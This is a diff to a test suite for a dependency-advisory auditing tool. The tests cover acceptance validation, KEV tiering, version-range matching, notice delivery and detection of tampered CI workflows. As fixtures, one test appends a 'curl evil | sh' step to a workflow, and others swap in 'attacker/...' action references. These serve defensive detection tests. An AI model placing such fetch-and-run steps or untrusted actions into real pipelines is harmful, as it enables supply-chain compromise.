@@ -10,7 +10,7 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
 import { inventoryFingerprint, readInventory, unsupportedLockfiles } from '../../src/scripts/_lib/advisory_inventory.js';
 import { describe as describeFinding, readRemediations, remediationsPath } from '../../src/scripts/_lib/advisory_notice.js';
-import { assertAllowed, cvss3Base, type Fetcher, KEV_URL, kevEnrich, nativeAudits, osvQuery, type Runner, vendorAnnouncements } from '../../src/scripts/_lib/advisory_sources.js';
+import { assertAllowed, cvss3Base, type Fetcher, inRange, KEV_URL, kevEnrich, nativeAudits, osvQuery, type Runner, vendorAnnouncements } from '../../src/scripts/_lib/advisory_sources.js';
 import {
     announce,
     buildFindings,
@@ -318,7 +318,7 @@ describe('Phase 3 — proportion', () => {
     });
 
     it('an acceptance needs a reason and an expiry, and a grep-negative is not a reason (3.3)', () => {
-        expect(validateAcceptance({ id: 'CVE-1', reason: 'the parser is only reached with trusted input in CI', expires: '2026-12-01' })).toBeNull();
+        expect(validateAcceptance({ id: 'CVE-1', reason: 'the parser is only reached with trusted input in CI', expires: '2026-12-01' }, new Date('2026-10-21T00:00:00Z'))).toBeNull();
         expect(validateAcceptance({ id: 'CVE-1', reason: 'the parser is only reached with trusted input' })).toMatch(/expiry/);
         expect(validateAcceptance({ id: 'CVE-1', reason: 'grep found no usage of the function', expires: '2026-12-01' })).toMatch(/absence of a hit/);
     });
@@ -415,7 +415,7 @@ describe('session notice — council 2026-10-21 round 2 conditions', () => {
 });
 
 describe('hosts without a session slot (4.5)', () => {
-    it('the CLI banner path prints the advisory notice after a subcommand', async () => {
+    it('the CLI banner path delivers the advisory notice only to a terminal, and never consumes it unseen', async () => {
         const { root } = await run('F4-malware');
         // The tsx LOADER in this process, as the dispatcher runs it: the tsx CLI
         // would put the script in a child whose fd 3 is an IPC channel.
@@ -428,18 +428,20 @@ describe('hosts without a session slot (4.5)', () => {
                 timeout: 60000,
                 stdio: fd3 ? ['ignore', 'pipe', 'pipe', 'pipe'] : ['ignore', 'pipe', 'pipe'],
             });
-        // No fd 3 (the dispatcher not handing over a terminal): nothing is
-        // delivered, so nothing is stamped — the notice is still there after.
-        const blind = go(false);
-        expect(blind.status).toBe(0);
-        expect(blind.stderr).not.toContain('MAL-2026-1234');
-        const r = go(true);
-        expect(r.status).toBe(0);
-        const fd3 = String(r.output[3] ?? '');
-        expect(fd3).toContain('MAL-2026-1234');
-        expect(fd3).toContain('fix now: /audit deps fix MAL-2026-1234');
-        // Delivered once: the same day prints nothing again.
-        expect(String(go(true).output[3] ?? '')).toBe('');
+        // Neither no fd 3 nor a fd 3 that is not a terminal (a pipe, a log,
+        // /dev/null) delivers the notice — and neither consumes it.
+        for (const fd3 of [false, true]) {
+            const r = go(fd3);
+            expect(r.status).toBe(0);
+            expect(r.stderr).not.toContain('MAL-2026-1234');
+            expect(String(r.output[3] ?? '')).toBe('');
+        }
+        // So the session start still has it to show.
+        const shown = sessionNotice(root);
+        expect(shown).toContain('MAL-2026-1234');
+        expect(shown).toContain('fix now: /audit deps fix MAL-2026-1234');
+        // A caller that delivered it stamps it; one that could not does not.
+        expect(sessionNotice(root)).toBeNull();
     }, 90000);
 });
 
@@ -776,7 +778,7 @@ describe('R2 round 4 fixes (2026-10-21)', () => {
     });
 
     it('#10 — "not reachable" with its mechanism named is a reason; bare, it is not', () => {
-        expect(validateAcceptance({ id: 'X', reason: 'not reachable: the XML parser is never imported by the production bundle', expires: '2027-01-01' })).toBeNull();
+        expect(validateAcceptance({ id: 'X', reason: 'not reachable: the XML parser is never imported by the production bundle', expires: '2027-01-01' }, new Date('2026-10-21T00:00:00Z'))).toBeNull();
         expect(validateAcceptance({ id: 'X', reason: 'the path is not reachable here', expires: '2027-01-01' })).not.toBeNull();
         expect(validateAcceptance({ id: 'X', reason: 'grep found nothing for the vulnerable call', expires: '2027-01-01' })).not.toBeNull();
     });
@@ -796,5 +798,82 @@ describe('R2 round 4 — a planned workflow pin is the fix, anything else in it 
         expect(suspiciousInBranch(root, base, [])).toEqual(['.github/workflows/ci.yml']);
         fs.appendFileSync(path.join(wf, 'ci.yml'), '      - run: curl evil | sh\n');
         expect(suspiciousInBranch(root, base, ['.github/workflows/ci.yml'])).toEqual(['.github/workflows/ci.yml']);
+    });
+});
+
+describe('R2 round 5 fixes (2026-10-21)', () => {
+    it('#1 — a project with advisories.mode off is neither refreshed nor indexed', async () => {
+        const root = project('F1-fastify-hono');
+        fs.writeFileSync(path.join(root, '.agent-settings.yml'), 'advisories:\n  mode: off\n');
+        const { fetcher, log } = replay('F1-fastify-hono');
+        const r = await refreshMany([root], { now: new Date(), fetcher, machineDir: machine, force: true, egress: 'query', runner: () => ({ code: -1, stdout: '' }) });
+        expect(r).toEqual([]);
+        expect(log.length).toBe(0);
+        expect(fs.existsSync(path.join(machine, 'projects.json'))).toBe(false);
+    });
+
+    it('#3 — npm audit’s own range narrows a finding to the affected versions', () => {
+        expect(inRange('4.17.20', '<4.17.21')).toBe(true);
+        expect(inRange('4.17.21', '<4.17.21')).toBe(false);
+        expect(inRange('2.0.0', '>=1.0.0 <1.2.3 || >=2.0.0 <2.0.1')).toBe(true);
+        expect(inRange('1.5.0', '>=1.0.0 <1.2.3 || >=2.0.0 <2.0.1')).toBe(false);
+        expect(inRange('1.0.0', '^1.0.0')).toBeNull();
+    });
+
+    it('#7 — an expiry is a real future day within a year', () => {
+        const now = new Date('2026-10-21T00:00:00Z');
+        const ok = { id: 'X', reason: 'the parser is only reached with trusted input in CI' };
+        expect(validateAcceptance({ ...ok, expires: '2026-13-45' }, now)).toMatch(/calendar day/);
+        expect(validateAcceptance({ ...ok, expires: '2026-10-01' }, now)).toMatch(/future/);
+        expect(validateAcceptance({ ...ok, expires: '9999-12-31' }, now)).toMatch(/at most/);
+        expect(validateAcceptance({ ...ok, expires: '2027-06-01' }, now)).toBeNull();
+    });
+
+    it('#8 — KEV raises exactly one tier', () => {
+        const base = { verdict: 'fix-available' as const, score: null, kev: true, scope: 'runtime' as const, ecosystem: 'npm' };
+        expect(tierOf({ ...base, severity: 'low' })).toBe('T2');
+        expect(tierOf({ ...base, severity: 'moderate' })).toBe('T1');
+        expect(tierOf({ ...base, severity: 'high' })).toBe('T0');
+    });
+
+    it('#14 — an announced finding prints once, however many days the cache sits unrefreshed', () => {
+        const root = project('F1-fastify-hono');
+        const sp = statePath(root)!;
+        fs.mkdirSync(path.dirname(sp), { recursive: true });
+        const t = new Date('2026-10-21T08:00:00Z');
+        const f = { key: 'K|fastify|5.12.4', id: 'K', aliases: [], verdict: 'fix-available', tier: 'T1', ecosystem: 'npm', package: 'fastify', version: '5.12.4', fixed: '5.12.5', severity: 'high', score: null, kev: false, date: null, scope: 'runtime', sources: ['osv'], modified: null, file: 'package-lock.json', line: 1, note: null };
+        fs.writeFileSync(sp, JSON.stringify({ schema: 1, root, at: t.toISOString(), fingerprint: 'x', inventory: [], findings: [f], reports: [], ledger: emptyLedger(), acceptances: [], notice: { at: t.toISOString(), interrupt: ['K|fastify|5.12.4'], digest: 0 }, silent_since: {} }));
+        expect(sessionNotice(root, t)).toMatch(/fix now/);
+        const later = sessionNotice(root, new Date('2026-10-23T08:00:00Z'));
+        expect(later ?? '').not.toMatch(/fix now/);
+        expect(later ?? '').toMatch(/data is 2 day/);
+    });
+
+    it('#15 — one source, one unknown, however many reports', () => {
+        const out = buildFindings([], [], [
+            { source: 'native-npm', status: 'unavailable', reason: 'lockfile-unsupported: yarn.lock' },
+            { source: 'native-npm', status: 'error', reason: 'unparseable' },
+        ], { now: new Date(), acceptances: [] });
+        expect(out.map((x) => x.key)).toEqual(['UNKNOWN-native-npm']);
+    });
+});
+
+describe('R2 round 5 — a swapped action is not a pin', () => {
+    it('#2 — the same action at a new ref passes; another action, or a new step, does not', () => {
+        const root = project('F1-fastify-hono');
+        const wf = path.join(root, '.github', 'workflows');
+        fs.mkdirSync(wf, { recursive: true });
+        const yml = (uses: string, extra = ''): string => `jobs:\n  t:\n    steps:\n      - uses: ${uses}\n${extra}`;
+        fs.writeFileSync(path.join(wf, 'ci.yml'), yml('actions/checkout@v4.1.0'));
+        execFileSync('git', ['-C', root, 'add', '-A']);
+        execFileSync('git', ['-C', root, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'base']);
+        const base = execFileSync('git', ['-C', root, 'rev-parse', 'HEAD'], { encoding: 'utf-8' }).trim();
+        const planned = ['.github/workflows/ci.yml'];
+        fs.writeFileSync(path.join(wf, 'ci.yml'), yml('actions/checkout@v4.2.2'));
+        expect(suspiciousInBranch(root, base, planned)).toEqual([]);
+        fs.writeFileSync(path.join(wf, 'ci.yml'), yml('attacker/checkout@main'));
+        expect(suspiciousInBranch(root, base, planned)).toEqual(planned);
+        fs.writeFileSync(path.join(wf, 'ci.yml'), yml('actions/checkout@v4.2.2', '      - uses: attacker/x@main\n'));
+        expect(suspiciousInBranch(root, base, planned)).toEqual(planned);
     });
 });
